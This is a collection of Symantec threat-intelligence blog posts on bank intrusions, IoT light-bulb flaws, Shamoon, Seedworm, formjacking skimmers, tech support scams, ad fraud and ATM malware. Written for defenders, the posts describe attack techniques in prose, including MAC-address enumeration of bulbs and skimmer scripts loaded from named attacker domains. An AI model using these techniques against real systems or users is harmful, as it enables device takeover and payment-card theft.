    "content": "Banks and other financial institutions in a number of West African countries have been targeted bycyber criminalsemploying a range of commodity malware and living off the land tools. The attacks have been underway since at least mid-2017. To date, organizations in Cameroon, Congo (DR), Ghana, Equatorial Guinea, and Ivory Coast have been affected. Who is behind these attacks remains unknown. They could be the work of a single group or, more likely, several different groups employing similar tactics. Symantec has observed four distinct attack campaigns directed against financial targets in Africa. The first has been underway since at least mid-2017 and has targeted organizations in Ivory Coast and Equatorial Guinea. The attackers infected victims with commodity malware known as NanoCore (Trojan.Nancrat) and were also observed using PsExec, a Microsoft Sysinternals tool used for executing processes on other systems, on infected computers. Lure documents used by the attackers referred to a West African bank which has operations in several countries in the region. Some tools used in these attacks are similar to tools mentioned in a 2017 SWIFT alert, indicating the attackers may have been attempting to perform financial fraud. The second type of attack began in late 2017 and targeted organizations in Ivory Coast, Ghana, Congo (DR), and Cameroon. The attackers used malicious PowerShell scripts to infect their targets and also used the credential-stealing tool Mimikatz (Hacktool.Mimikatz). They also made use of UltraVNC, an open-source remote administration tool for Microsoft Windows. The attackers then infected computers with the commodity malware known as Cobalt Strike (Trojan.Agentemis) which is capable of opening a backdoor on the computer, communicating with a command and control (C&C) server, and downloading additional payloads. Communication with the C&C server was handled by dynamic DNS infrastructure, which helped shield the location of the attackers. The third type of attack was directed against an organization in Ivory Coast. This organization had also been targeted by the second campaign. This second attack also involved the use of commodity malware, in this case the Remote Manipulator System RAT (Backdoor.Gussdoor), alongside Mimikatz and two custom Remote Desktop Protocol (RDP) tools. Since Mimikatz can be used to harvest credentials and RDP allows for remote connections to computers, it’s likely the attackers wanted additional remote access capability and were interested in moving laterally across the victim’s network. The fourth type of attack began in December 2018 and was directed against organizations in Ivory Coast. The attackers used off-the-shelf malware known as Imminent Monitor RAT (Infostealer.Hawket). All four attack types were first discovered through alerts generated by Symantec’sTargeted Attack Analytics (TAA). TAA leverages advanced artificial intelligence to analyze Symantec’s data lake of telemetry in order to spot patterns associated with targeted attacks. A growing number of attackers in recent years are adopting “living off the land” tactics—namely the use of operating system features or network administration tools to compromise victims' networks. By exploiting these tools, attackers hope to hide in plain sight, since most activity involving these tools is legitimate. However, in each case, a TAA alert was triggered by the attackers maliciously using a legitimate tool. In short, the attackers' use of living off the land tactics led to the discovery of their attacks. Whether the attacks were the work of one or more groups remains unknown. However, they share some commonalities in terms of the tools and tactics employed. Any malware used was off-the-shelf, commodity malware: Cobalt Strike, Imminent Monitor RAT, NanoCore RAT, Remote Manipulator System RAT, and Mimikatz. Additionally, most of the attacks leveraged living off the land tactics, making use of tools such as PowerShell, PsExec, UltraVNC, and RDP. Commodity malware is readily available on the cyber underground. While it may not be as powerful or stealthy as custom-developed tools, it does add a certain level of anonymity to attacks, making it harder to link attacks together and attribute them to any one group of attackers. Until now, Symantec has seen relatively little evidence of these kinds of attacks against the financial sector in West Africa. However, it now appears that there is at least one (and quite possibly more) groups actively targeting banks in the region. Symantec has the following protection in place to protect customers against these attacks: The following list of indicators of compromise is related to African banking attacks. It is likely that these indicators are used by multiple different actors.

    "title": "leaky christmas lights hijacked",
    "link": "https://www.security.com/threat-intelligence/leaky-christmas-lights-hijacked",
    "content": "Internet of Things (IoT) devices for the home continue to be popular, and many people may be considering buying more smart home gadgets this Christmas. It seems that every device now has a smart version that can be integrated into the home network, from microwaves to showers, from heating to smoke detectors. Symantec constantly analyzes the risks associated with IoT devices and their various possible attack vectors. Recently, while looking at new threats to IoT devices, we came across some security issues in a remote-controlled, full-color LED light bulb. It’s a low-priced brand that can be bought at many online stores and is easy to use and integrate with popular voice-activated smart assistants. In order to set up and use the light bulb to its full extent, the user has to install a smartphone app and create a free account. The light bulb will then be added to the local Wi-Fi network and can be controlled remotely through the internet. The first thing we noticed while analyzing the network traffic was that the smartphone application was mostly using plain HTTP requests to interact with the backend in the cloud. Only a few requests, for example to register a new user or to log in, were sent encrypted over HTTPS. Unfortunately, some of the unencrypted requests contained a lot of private information. For example, when the user decides to change the internal name of a light bulb, an unencrypted POST request is sent with the user’s email address in cleartext and the MD5 hash of the unsalted password. This means that anyone with access to the network could potentially sniff this traffic and brute-force the password hash. If the password is not very complex, there is a very good chance for the attacker to crack it. To make matters worse, the application does not provide an option to change the password; once the user has chosen one, it is fixed. Equipped with this data, an attacker could log into the account and take over all of the user’s light bulbs. Unfortunately, some of the unencrypted requests contained a lot of private information. Anyone in the network path could potentially sniff this traffic and brute-force the password hash. This is not the only device where we have seen information being sent in cleartext. Unfortunately, the use of unencrypted traffic is still very common with many devices and applications. The API on the backend allows a user to find the user account that is associated with a specific light bulb by sending the MAC address of that device. There is no verification to determine whether the user account used to query a device is actually associated with that device. Therefore, an attacker only needs an active session that has already been authenticated, and can then guess or brute-force the MAC address of a target device. This method allows an attacker to enumerate all possible MAC addresses for the vendor in question and find any light bulb that is activated and remotely controllable. For each device that is found, the attacker receives the unique ID and the user’s email address in cleartext. The request is a simple GET request over plain HTTP. An attacker could use this trick to gather valid email addresses and use them in further attacks, such as spam, or use the gathered information to attack the light bulb itself. Once a remote-controllable device is found, an attacker can interact with the device. This action does not require knowledge of the password. Similar to the enumeration weakness, all that is required is an authenticated session and the MAC address of the device. Each light bulb can be controlled by multiple users and can therefore also be linked to multiple accounts. Once the connection is established, the attacker can turn the lights off or on, change the color, or rename it. The attacker gains full control over the lights, just like it was their own home. The vendor did previously upgrade the applications to use a more secure API function that requires a security token. Unfortunately, for legacy reasons, the old API is still accepting the unsecure requests. Once the connection is established, the attacker can turn the lights off or on, change the color, or rename it. The attacker gains full control over the lights, just like it was their own home. This is just one example showcasing that there are still a lot of simple security gaps within IoT devices that need to be fixed. Fancy exploits are not always required to take over such devices. Sometimes, as demonstrated in this case, simple design mistakes can be enough to expose users’ private data and devices to the public internet. Anyone could have taken over these smart light bulbs and controlled them. As of this writing, we do not have any indication that these devices have been exploited in the wild. We have reported all findings to the manufacturer. Other researchers have also found related issues with similar products. And of course, there are more possible attack vectors, even with these light bulbs, that we have not covered in this blog. Buyers of such IoT devices need to be aware of the potential risks they expose themselves to. As attacks go, having your smart light bulbs remotely controlled by an attacker might not be so severe, but it could be unsettling nonetheless, and it could be only the first step in a bigger attack scenario. Thus, make sure to follow some of these basic guidelines when installing smart devices over the holiday season, so attackers will not be able to turn off your Christmas lights: Candid Wueest works for Symantec's Security Technology and Response (STAR) division.

    "title": "shamoon destructive threat re emerges new sting its tail",
    "link": "https://www.security.com/threat-intelligence/shamoon-destructive-threat-re-emerges-new-sting-its-tail",
    "content": "After a two-year absence, the destructive malware Shamoon (W32.Disttrack.B)re-emerged on December 10 in a new wave of attacks against targets in the Middle East. These latest Shamoon attacks are doubly destructive, since they involve a new wiper (Trojan.Filerase) that deletes files from infected computers before the Shamoon malware wipes the master boot record. News of the attacks first emerged on December 10 when Italian oil services firm Saipem said that it had beenhit by a cyber attackagainst its servers in the Middle East. Two days later,the company saidthat Shamoon had been used in the attack, which affected between 300 and 400 servers and up to 100 personal computers. Symantec has found evidence of attacks against two other organizations during the same week, in Saudi Arabia and the United Arab Emirates. Both organizations are involved in the oil and gas industry. Unlike previous Shamoon attacks, these latest attacks involve a new, second piece of wiping malware (Trojan.Filerase). This malware will delete and overwrite files on the infected computer. Shamoon itself will meanwhile erase the master boot record of the computer, rendering it unusable. The addition of the Filerase wiper makes these attacks more destructive than use of the Shamoon malware alone. While a computer infected by Shamoon could be unusable, files on the hard disk may be forensically recoverable. However, if the files are first wiped by the Filerase malware, recovery becomes impossible. Filerase is spread across the victim’s network from one initial computer using a list of remote computers. This list is in the form of a text file and is unique to each victim, meaning the attackers likely gathered this information during an earlier reconnaissance phase of the intrusion. This list is first copied by a component called OCLC.exe and passed on to another tool called Spreader.exe. The Spreader component will then copy Filerase to all the computers listed. It will then simultaneously trigger the Filerase malware on all infected machines. It is possible that the Shamoon malware itself was spread via these same tools, but this is unknown. In at least one instance, Shamoon was executed using PsExec, indicating that the attackers had access to credentials for the network. One of the new Shamoon victims Symantec observed the organization in Saudi Arabia had recently also been attacked by another group Symantec calls Elfin (aka APT33) and had been infected with the Stonedrill malware (Trojan.Stonedrill). There were additional attacks against this organization in 2018 that may have been related to Elfin or could have been the work of yet another group. The proximity of the Elfin and the Shamoon attacks against this organization means it is possible that the two incidents are linked. Shamoon (W32.Disttrack)first emerged in 2012when it was used in a series of disruptive attacks against the Saudi energy sector. Activity then ceased until it madea surprise comeback in late 2016. A slightly modified version of the malware (W32.Disttrack.B)was used in attacks against a range of targets, again in Saudi Arabia. The attacks appeared timed to cause maximum destruction. The malware was configured to trigger at 8:45pm local time on Thursday, November 17, 2016. The Saudi working week runs from Sunday to Thursday, meaning computers were wiped after most staff had left for the weekend, minimizing the chance of discovery before the attack was complete. Why Shamoon has suddenly been deployed again remains unknown. However, the fact that the malware seems to be taken out of retirement every few years means that organizations need to remain vigilant and ensure that all data is properly backed up and a robust security strategy is in place. Symantec has the following protections in place against the Shamoon attacks: File-based protections Network-based protections (Intrusion Prevention System) Customers of the DeepSight IntelligenceManaged Adversary and Threat Intelligence(MATI) service have received reports on Shamoon which detail methods of detecting and thwarting activities of this adversary..

    "title": "seedworm espionage group",
    "link": "https://www.security.com/threat-intelligence/seedworm-espionage-group",
    "content": "Symantec researchers have uncovered extensive insights into a cyber espionage group behind a recent series of cyber attacks designed to gather intelligence on targets spread primarily across the Middle East as well as in Europe and North America. The group, which we call Seedworm (aka MuddyWater), has been operating since at least 2017, with its most recent activity observed in December 2018. Analysts in ourDeepSight Managed Adversary and Threat Intelligence(MATI) team have found a new backdoor,Backdoor.Powemuddy, new variants of Seedworm’s Powermud backdoor (aka POWERSTATS), a GitHub repository used by the group to store their scripts, as well as several post-compromise tools the group uses to exploit victims once they have established a foothold in their network. In September 2018, we found evidence of Seedworm and the espionage groupAPT28(aka Swallowtail, Fancy Bear), on a computer within the Brazil-based embassy of an oil-producing nation. Seeing two active groups piqued our interest and, as we began pulling on that one string, we found more clues that led us to uncover new information about Seedworm. We not only found the initial entry point, but we were able to follow Seedworm’s subsequent activity after the initial infection due to the vast telemetry Symantec has access to via its Global Intelligence Network. Because of this unique visibility, our analysts were able to trace what actions Seedworm took after they got into a network. We found new variants of the Powermud backdoor, a new backdoor (Backdoor.Powemuddy), and custom tools for stealing passwords, creating reverse shells, privilege escalation, and the use of the native Windows cabinet creation tool, makecab.exe, probably for compressing stolen data to be uploaded.DeepSight MATIcustomers can leverage these unique insights to combat emerging cyber threats. Seedworm’s motivations are much like many cyber espionage groups that we observe—they seek to acquire actionable information about the targeted organizations and individuals. They accomplish this with a preference for speed and agility over operational security, which ultimately led to our identification of their key operational infrastructure. Seedworm likely functions as a cyber espionage group to secure actionable intelligence that could benefit their sponsor’s interests. During the operations, the group used tools consistent with those leveraged during past intrusions including Powermud, a custom tool used by the Seedworm group, and customized PowerShell, LaZagne, and Crackmapexec scripts. The Seedworm group controls its Powermud backdoor from behind a proxy network to hide the ultimate command-and-control (C&C) location. The Seedworm group is the only group known to use the Powermud backdoor. After compromising a system, typically by installing Powermud or Powemuddy, Seedworm first runs a tool that steals passwords saved in users’ web browsers and email, demonstrating that access to the victim's email, social media, and chat accounts is one of their likely goals. Seedworm then uses open-source tools such as LaZagne and Crackmapexec to obtain Windows authorization credentials. Seedworm uses off-the-shelf, unmodified versions of these tools as well as custom-compiled variants which we have determined are only used by this group. Since its existence first came to light, we’ve seen Seedworm modify the way it operates. Since early 2017, they have continually updated their Powermud backdoor and other tools to avoid detection and to thwart security researchers analyzing the tools. They’ve also used GitHub to store malware and a handful of publicly available tools, which they then customize to carry out their work. We have identified multiple online accounts that are likely associated with actors behind the Seedworm operations. The first finding was a public Github repository containing scripts that very closely match those observed in Seedworm operations. An additional link was then made to a persona on Twitter with similar profile data. This Twitter account follows numerous security researchers, including those who have written about the group in the past as well as developers who write the open-source tools they use. These accounts are likely controlled by the Seedworm group. The Github repository contains a PowerShell script that has been run on victim hosts in activity attributed to Seedworm; there are also numerous Crackmapexec PowerShell commands that match victim host activity. Choosing to rely on publicly available tools allows Seedworm to quickly update their operations by using code written by others and applying only small customizations. And they appear to adopt some of the most effective and capable tools, several of which—for these reasons—are also used by red team organizations. We analyzed data on 131 victims that were compromised by Seedworm’s Powermud backdoor from late September to mid-November 2018. Observed Seedworm victims were located primarily in Pakistan and Turkey, but also in Russia, Saudi Arabia, Afghanistan, Jordan, and elsewhere. Additionally, the group compromised organizations in Europe and North America that have ties to the Middle East. Additionally, during our analysis of Powermud victims, we were able to identify the probable industry sector for 80 of the 131 unique victims. The telecommunications and IT services sectors were the main targets. Entities in these sectors are often \"enabling victims\" as telecommunications providers or IT services agencies and vendors could provide Seedworm actors with further victims to compromise. Successfully compromising victims in these two industries provides additional clues about the sophistication and skills of the Seedworm group. The next most common group of victims was in the oil and gas sector. All 11 victims in this group belong to one Russian firm that is active in the Middle East. Only one of these 11 victims was physically located in Russia; the rest were spread out across North America, the Middle East, Africa, and Asia. Universities and embassies were the next most common targets. The universities were in the Middle East and the embassies were primarily based in Europe representing Middle East countries. Two major non-governmental organizations (NGOs) were also compromised; we identified seven victims who worked within these global public health organizations. Symantec has notified the appropriate public and private sector partners regarding Seedworm’s latest targets, tools and techniques..

    "title": "formjacking targeting popular stores",
    "link": "https://www.security.com/threat-intelligence/formjacking-targeting-popular-stores",
    "content": "Formjacking, the use of malicious JavaScript code to steal credit card details and other information from payment forms on the checkout webpages of e-commerce sites, has been making headlines lately. In ourprevious blog, we discussed how formjacking generally works and cited a few publicly reported attacks that targeted popular online businesses. In this blog, we look at the more technical aspects of formjacking and detail a new campaign affecting a number of top shopping sites. Recently, we came across a website of a retail store in Paris which was injected with a formjacking script (Figure 1). The code shown in Figure 1 collects the payment information entered by users on the website and posts it to the domaingoogle-analyitics.org. This domain is a typo-squatted version of the legitimate Google Analytics domain,google-analytics.com. This was no new occurrence for us, considering the number of payment information-stealing script injections we see daily. However, digging into our telemetry, we came across an interesting pattern. We observed popular websites from different countries—such as the U.S., Japan, Australia, and Germany—redirecting to this one Paris website. This created an interesting redirection chain as customers of all these websites were being infected by formjacking at the same time. Figure 2 shows how this infection chain works. In a few cases, even all the regional websites of one brand were affected, redirecting to the same Paris website. We have been able to identify over 30 popular websites affected by this new infection wave, including fashion stores, educational websites, websites selling sports gear, etc. Looking at our telemetry, we can confirm that this campaign has been around since at least November 25, 2018. To make matters worse, another piece of injected code on the same web page looks for the presence of debugging tools, such as Firebug, to thwart security researchers analyzing the malicious script. This latest formjacking campaign highlights the fact that attackers are continuously altering and improving their malicious code and exploring new delivery mechanisms to infect more users. This attack chain is unique in the sense that it differs from the prevalent supply chain formjacking attack, where attackers compromise popular third-party script library providers. As these scripts are loaded by many websites, with one compromise the attacker manages to load their malicious code on a large number of websites all at the same time. In our scenario, the redirecting website and the compromised website in many cases come from different areas of the online shopping landscape, dealing in entirely different product spaces. Symantec is currently notifying and working with the affected retailers to help address this issue, so we won’t be naming them here. This latest formjacking campaign highlights the fact that attackers are continuously altering and improving their malicious code and exploring new delivery mechanisms to infect more users. In addition to the code previously mentioned, we have seen many other scripts injected into websites to steal payment information in various ways. For example, the code shown in Figure 4 was injected into one set of affected websites. The script creates a script element and sets its source tohttps://apitstatus.com/api.js?v=3.0.8. This forces the browser to load malicious obfuscated JavaScript fromapitstatus.com, which in turn collects the entered payment information and posts it back to the attackers’ domain. On yet another set of websites, we discovered the code shown in Figure 5. This obfuscated script applies a hook onto forms on the website and collects all the information entered by visitors. The script also extracts the URL loaded in the browser and determines if the checkout page of the website is loaded. If it has, the script sends the collected form information, which is now the payment information, back to the attacker-controlled domain. This version of a formjacking script was used in various high-profile breaches such as Ticketmaster UK, Shopper Approved, and Feedify. In recent months, we have seen a major uptick in formjacking attacks against high-profile websites across the globe. From our telemetry, we have also observed locally popular websites (those with an Alexa Rank of less than 5,000 in a particular country) in the U.S., Japan, Germany, and Australia, among other countries, being injected with formjacking scripts. Symantec’s Intrusion Prevention System (IPS) technology proactively protects website users from formjacking attacks. In the past three months alone, IPS has blocked more than 1 million formjacking attempts on more than 10,000 unique websites. Taking into account supply chain attacks, which can allow attackers to gain access to large companies by exploiting weaknesses in smaller businesses used by the larger company to provide different services, we can easily say that the actual number of infected websites is bound to be higher. Victims may not realize they are victims of formjacking, as generally their websites continue to operate as normal, and attackers are sophisticated and stealthy and take steps to avoid detection. Symantec customers are protected from formjacking attacks. Website owners should also be aware of the dangers of software supply chain attacks, as these have been used as the infection vector in some of these formjacking attacks. Software supply chain attacks can be difficult to guard against, but there are some steps that website owners can take: Producers of software packages should ensure that they are able to detect unwanted changes in the software update process and on their website. Website owners can also use content security policies withSubresource Integrity (SRI) tagsto lock down any integrated third-party scripts.

    "link": "https://www.security.com/threat-intelligence/tech-support-scams-part-3",
    "content": "In my previousblog, I discussed how technical support scammers embraced the technique of “living off the land” by making use of encryption algorithms such as Advanced Encryption Standard (AES) to obfuscate scam content. In the past, I alsowroteabout scammers’ use of simple encoding techniques to avoid string-based detection engines. In both scenarios, the scam made use of one unique technique across the board. The same obfuscation technique was used multiple times to decode the content on the fly and then perform its intended tasks: scaring the victim through various means, such as non-closing windows, pop-up windows which never seem to go away, preventing the victim from closing the scam by disallowing the pressing of certain keyboard keys, among others. This blog completes my trilogy of posts on obfuscated scams. This time, I look at how scammers make use of multiple encoding techniques at one go to create a multiple-level obfuscated scam which offers very little scope for detection engines. Typically, the scam starts when an unsuspecting user visits a malicious website or is redirected to one by various means, such as a malvertisement or compromised website. One such scam I observed on November 9 was in Italian, although similar campaigns may also come in other languages. This one in particular informs the victim that their computer has been blocked due to “display and dissemination of materials prohibited by Italian law” such as adult content. It also informs the victim that to unblock their computer, they must pay an “administrative penalty” of 500 euros with an iTunes Gift Card. Such tactics are designed to incite worry among victims and get them to pay. Going through the source code of the scam reveals a large chunk of obfuscated content, as shown in Figure 2. Moving further, I observed the code used for decryption of this obfuscated data: First, the obfuscated content is captured into a variable and then converted into a base64-encoded content. Then, this base64-encoded content is decoded using the function “atob” and written on the browser, as shown in Figure 3. After decoding the base64 content, I was able to see a few of the strings which the scam displays to the victim. However, the story does not end here. Moving further, I could still see obfuscated code and decryption routines being used. The code also loads the following JavaScript library, which is interesting: <script src=“https://cdnjs.cloudflare.com/ajax/libs/crypto-js/3.1.2/rollups/aes.js”></script><script> This CryptoJS library is widely used for AES obfuscation and deobfuscation. This indicates the scam uses AES as its second-level obfuscation technique. Decoding the AES obfuscated content reveals the final layer of the scam with almost no obfuscation being used. While code obfuscation has been used in scams for a while now, the use of multiple-level encoding is not common. The scam typically forces string-based detection engines to focus detection on strings of random numbers or characters as described above, which, in most scenarios, is highly prone to false positives. Thus, it can be said that this scam uses living off the land encoding techniques to sneak through antivirus engines and avoid detection. Symantec proactively protects customers against tech support scams. Our intrusion prevention system (IPS) technology protects customers against tech support scams by blocking malicious network activity associated with such scams using a wide variety of detections. From July through October 2018, Symantec’s IPS technology blocked more than 37 million tech support scams. Our IPS telemetry for this year shows that the countries most targeted by tech support scams were the U.S., Japan, Canada, UK, and Germany. From July through October 2018, Symantec IPS technology blocked more than 37 million tech support scams. Our IPS telemetry for 2018 shows that the countries most targeted by these scams were the U.S., Japan, Canada, UK, and Germany. Norton Security,Symantec Endpoint Protection, and many otherSymantec security productshave comprehensive network-based protection features such as firewall and IPS built in. To protect yourself from these types of scams, ensure that these features are enabled. Also, make sure to only visit legitimate websites when you need support for any product.

    "content": "An FBI-led law enforcement takedown dubbedOperation Eversion has led to the indictment of eight defendantsand the seizure of infrastructure associated with the 3ve ad-fraud scam. Symantec was involved in an industry group which assisted in the investigation by helping identify infrastructure used by the attackers. 3ve specializes in creating fake versions of legitimate websites in order to carry advertisements. It then drives fake traffic to these advertisements using infected computers. These fake visitors generate click-through revenue from the ads for the attackers. 3ve leveraged up to 700,000 infected computers and controlled over 1.7 million IP addresses at one point. Much of the fraudulent traffic was facilitated through botnets controlled by the Miuref (Trojan.Miuref) and Kovter (Trojan.Kotver) malware families. The machines that used the Miuref botnet were located mostly in data centers and were tasked with browsing to counterfeit websites. When the websites were loaded into a browser, requests were made for ads to be placed on those pages. These data center computers used the Miuref botnet as a proxy to request the ads in order to hide the true location of the request. The Kovter component of the ad-fraud operation used the Kovter botnet to run a hidden instance of the Chrome web browser on infected computers. The browser was used to visit the counterfeit websites. Once loaded, they requested ads to be placed on the website pages. Miuref and Kovter are Trojans spread through malicious email attachments and drive-by downloads from infected websites. Miuref loads several executable files onto infected computers. They may be found in one or more of the following locations: The HKEY_CURRENT_USER “Run” key is set to the path of one of the executables listed above: Kovter infections are located mostly in the registry, but the following files may be found on infected computers: Kovter is known to hide in the registry under: The keys appear like random values and contain scripts. In some cases, a user-agent string can be clearly identified. An additional key containing a link to a Bash script on the hard drive may be placed within the following registry key: Kovter is an evolution ofan older botnet known as Poweliks(Trojan.Poweliks). Like Kovter, Poweliks is a fileless threat that was developed from an earlier file-based variant, known at that time as Wowliks. Like Kovter, Poweliks was mainly deployed as a click-fraud botnet. Infected computers would silently visit web pages in a hidden browser window and display advertisements in that window. Symantec and Norton products protect against these threats as: If you believe you may be infected with Miuref or Kovter and are not a Symantec customer, you can use our free toolNorton Power Eraserto remove it from your system. Customers of the DeepSight IntelligenceManaged Adversary and Threat Intelligence(MATI) service have received reports on uses of the Kovter malware and how adversary groups have utilized this fileless threat in malicious advertising attacks.

    "content": "As we enter the busiest shopping period of the year, both offline and online retailers and consumers are facing risks to the security of their payment card data. Formjacking has surged in 2018—with Symantec blocking almost 700,000 formjacking attempts from mid-September to mid-November alone. This surge in formjacking is one of the big stories of 2018—withattackerslike Magecart using supply chain attacks and other tactics to inject malicious scripts into websites to steal payment card information. There have also beenattackson point-of-sale (PoS) systems in bricks-and-mortar stores this year, though none so far that compare to the mega breaches of earlier this decade, which saw tens of millions of credit cards compromised in a single breach. According to recent research from Symantec’s DeepsightManaged Adversary and Threat Intelligence (MATI) team(published in the MATI reportHow Cyber Criminals Monetize Unauthorized PoS System Access And Stolen Card Data- 01 Nov 2018), on dark net marketplaces threat actors are advertising access to PoS systems at prices ranging from $12 for administrative access to one PoS machine, to $60,000 for access to a large corporate network containing thousands of PoS servers and terminals. Meanwhile, depending on its quality, payment card data on the dark web retails for between $1 and $175 per card. The techniques used by PoS scammers remain straightforward and have not evolved greatly in the last number of years, with scammers still using “RAM-scraping” malware to steal payment card details. This RAM-scraping malware works because of how data generally travels around retailers’ systems. Two high-profile actors in the PoS malware space are FIN7 and FIN6. FIN7 is a well-known group that is reported to have stolen more than $1 billion from companies around the world. FIN7 uses sophisticated spear-phishing emails to convince targets to download an attachment that then infects their company network with malware. The malware used by FIN7 is most commonly a tailored version of theCarbanak malware, which has been used in multiple attacks on banks. Companies compromised by FIN7 include well-known brands like Chipotle, Chilli’s, and Arby’s, with the group thought to have compromised thousands of business locations and to have stolen millions of credit card numbers. FIN6 was first spotted in 2016 when it used the Grabnew backdoor and theFrameworkPOSmalware to steal the details of more than 10 million credit cards.The group was also active in 2018, and was seen exploiting living off the land tools such as Windows Management Instrumentation Command (WMIC) and the Metasploit framework to execute PowerShell commands. Both groups are believed to have made many millions of dollars selling the card details they steal on dark web marketplaces—with the Joker’s Stash marketplace appearing to be where most of these transactions take place. However, a few factors have emerged in recent times that may impact the environment around PoS attacks, and the activity of these groups: One new actor we have seen engaged in malicious activity on PoS machines in 2018 is a group we have dubbed Fleahopper. Fleahopper has been active since at least July 2017. It is a financially motivated group that appears to be monetizing its victims by stealing information from infected machines running PoS software. In the latter half of 2018, Fleahopper has been observed using the Necurs botnet to infect victims. It does this in two ways: through Necurs bots and through spam email, likely originating from the Necurs botnet. Symantec has observed Fleahopper delivering malware directly through Necurs bots, where the bots drop malware from Fleahopper onto machines already infected by Necurs. Machines that are not infected with Necurs may still be infected by Fleahopper through spam that comes from the Necurs botnet. Spam emails that deliver malware from Fleahopper have been observed with malicious Microsoft .pub files attached. These .pub files download an installer for the malware used by Fleahopper,Trojan.FlawedAmmyy. The Trojan.FlawedAmmyy RAT is a modified version of the publicly available remote access tool Ammyy Admin (Remacc.Ammyy). Although Trojan.FlawedAmmyy is not believed to be exclusive to Fleahopper, the group has been observed using Trojan.FlawedAmmyy to deliver its tools. Once they've compromised an organization, Fleahopper has been observed dropping a number of files onto machines running POS software. Fleahopper installs a modified legitimate Remote Desktop Protocol (RDP) file onto infected machines running POS software. This gives Fleahopper remote desktop access to the infected machine that is separate from access through malware. Symantec has observed Fleahopper using this access. Symantec has observed Fleahopper activity on machines in grocery stores, furniture stores, restaurants and a store selling men’s clothing. The group’s activity appears to be spread around the globe, with some activity seen targeting businesses based in the U.S. and the U.K. Some of the other PoS malware that has been seen used by various groups in the wild in 2018 includes: RtPOS, Prilex, LusyPOS,LockPOS, GratefulPOS, and FindPOS. There have been several publicly reported attacks on PoS systems in 2018: The compromise of Hudson’s Bay Company’s stores and Chili’s has been linked to FIN7. While these were significant compromises—the details of at least 5 million cards were compromised when the Hudson’s Bay Company stores were targeted—there have been no reports so far of PoS attacks this year affecting tens of millions of consumers. This relative drop in activity in the PoS space compared to previous years could be down to the reasons mentioned above—the increased adoption of chip-and-PIN globally and upset in the FIN7 group. However, it may also indicate that attackers are looking at other ways to make money and get their hands on payment card details—for example, by turning to formjacking. We firstpublished research on formjacking at the end of September 2018, after a spate of high-profile attacks by the Magecart attack group. Among Magecart’s targets were Ticketmaster UK, British Airways, Feedify, and Newegg. One of itsmore recent targetswas British electronics kit retailer Kitronik. Formjacking is a term we use to describe the use of malicious JavaScript code to steal credit card details and other information from payment forms on the checkout web pages of e-commerce sites. It is not a new technique, but in the latter half of 2018, it has garnered a lot of attention due to some large campaigns, many of which have been carried out by Magecart.Recently released research has claimed that Magecart is not just one group—but rather approximately seven groups that are all engaged in similar activity. When a customer of an e-commerce site clicks “submit” or its equivalent after entering their details into a website’s payment form, malicious JavaScript code that has been injected there by the cyber criminals collects all entered information, such as payment card details and the user’s name and address. This information is then sent to the attacker’s servers. Attackers can then use this information to perform payment card fraud or sell these details to other criminals on the dark web. In a two-month period, from mid-September to mid-November, Symantec blocked almost 700,000 formjacking attempts—with a clear upward trend visible as we approach the holiday shopping season. Much as we reported in September, these formjacking attempts target a wide range of e-commerce websites, including a fashion retailer in Southeast Asia, and another in Australia, a U.S. website selling jewelry, and another U.S. store specializing in outdoor gear and equipment. Suppliers of equipment for dentists, and online stores selling gardening equipment, were also among those targeted. These formjacking attempts continue to target a wide range of stores—ranging from small to large retailers in various countries around the world. We detailed in our previous research how, in some cases, Magecart was using supply chain attacks to gain access to its targeted websites and carry out these formjacking attacks. The Magecart attackersinjected malicious JavaScript code into Ticketmaster’s websiteafter they compromised a chatbot from tech firm Inbenta that was used for customer support on Ticketmaster websites, for example. Magecart was then able to alter the JavaScript code on Ticketmaster’s websites to capture payment card data from customers and send it to their servers. Dutch security researcherWillem de Groot has discovered since thenthat Magecart is also exploiting unpatched vulnerabilities in 21 Magento extensions used by online stores to gain access to websites. Magento is an open-source e-commerce platform. Magecart is using a series of URL paths to probe Magento stores in the wild for the vulnerable extensions, and injecting its malicious code into vulnerable websites. As we approach the holiday shopping season, it is likely that we will see a ramping up of activity from actors out to steal consumers’ payment card details—both online and in retail stores worldwide. Victims may not realize they are victims of formjacking as generally their websites continue to operate as normal, and attackers like Magecart are sophisticated and stealthy and take steps to avoid detection. Website owners should be aware of the dangers of software supply chain attacks, as these have been used as the infection vector in some of these formjacking attacks. Software supply chain attacks can be difficult to guard against, but there are some steps that website owners can take: Producers of software packages should ensure that they are able to detect unwanted changes in the software update process and on their website. Website owners can also use content security policieswith Subresource Integrity tags (SRI)to lock down any integrated third-party script.

    "title": "fastcash lazarus atm malware",
    "link": "https://www.security.com/threat-intelligence/fastcash-lazarus-atm-malware",
    "content": "On October 2, 2018,an alert was issued by US-CERT, the Department of Homeland Security, the Department of the Treasury, and the FBI. According to this new alert, Hidden Cobra (the U.S. government’s code name for Lazarus) has been conducting “FASTCash” attacks, stealing money from Automated Teller Machines (ATMs) from banks in Asia and Africa since at least 2016. Lazarus is a very active attack group involved in both cyber crime and espionage. The group was initially known for its espionage operations and a number of high-profile disruptive attacks, including the 2014 attack on Sony Pictures. More recently, Lazarus has also become involved in financially motivated attacks, including anUS$81 million theft from the Bangladesh Central Bankand theWannaCry ransomware. Following US-CERT's report, Symantec’s research uncovered the key component used in the group's recent wave of financial attacks. The operation, known as “FASTCash”, has enabled Lazarus to fraudulently empty ATMs of cash. To make the fraudulent withdrawals, Lazarus first breaches targeted banks’ networks and compromises the switch application servers handling ATM transactions. Once these servers are compromised, previously unknown malware (Trojan.Fastcash) is deployed. This malware in turn intercepts fraudulent Lazarus cash withdrawal requests and sends fake approval responses, allowing the attackers to steal cash from ATMs. According to the U.S. government alert, one incident in 2017 saw cash withdrawn simultaneously from ATMs in over 30 different countries. In another major incident in 2018, cash was taken from ATMs in 23 separate countries. To date, the Lazarus FASTCash operation is estimated to have stolen tens of millions of dollars. In order to permit their fraudulent withdrawals from ATMs, the attackers inject a malicious Advanced Interactive eXecutive (AIX) executable into a running, legitimate process on the switch application server of a financial transaction network, in this case a network handling ATM transactions. The malicious executable contains logic to construct fraudulent ISO 8583 messages. ISO 8583 is the standard for financial transaction messaging. The purpose of this executable has not been previously documented. It was previously believed that the attackers used scripts to manipulate legitimate software on the server into enabling the fraudulent activity. However, analysis by Symantec has found that this executable is in fact malware, which we have namedTrojan.Fastcash. Trojan.Fastcash has two primary functions: Once installed on the server, Trojan.Fastcash will read all incoming network traffic, scanning for incoming ISO 8583 request messages. It will read the Primary Account Number (PAN) on all messages and, if it finds any containing a PAN number used by the attackers, the malware will attempt to modify these messages. How the messages are modified depends on each victim organization. It will then transmit a fake response message approving fraudulent withdrawal requests. 